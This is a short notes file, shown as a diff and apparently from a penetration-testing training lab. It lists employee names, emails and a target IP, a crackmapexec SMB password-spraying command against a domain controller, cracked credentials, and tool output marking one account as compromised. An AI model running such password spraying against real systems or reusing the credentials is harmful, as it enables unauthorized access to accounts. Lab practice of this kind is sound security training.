@@ -1,0 +1,28 @@
+John Marston
+Carol Johnson
+Jennifer Stapleton
+
+
+jmarston@inlanefreight.local 
+emma.williams@inlanefreight.com
+10.129.202.85
+
+
+crackmapexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
+
+
+jmarston:P@ssword!
+
+jstapleton:Winter2008
+
+
+jmarston@ILF.local
+cjohnson@ILF.local
+jstapleton@ILF.local
+
+
+
+
+SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\john.marston:P@ssword! STATUS_LOGON_FAILURE 
+
+SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
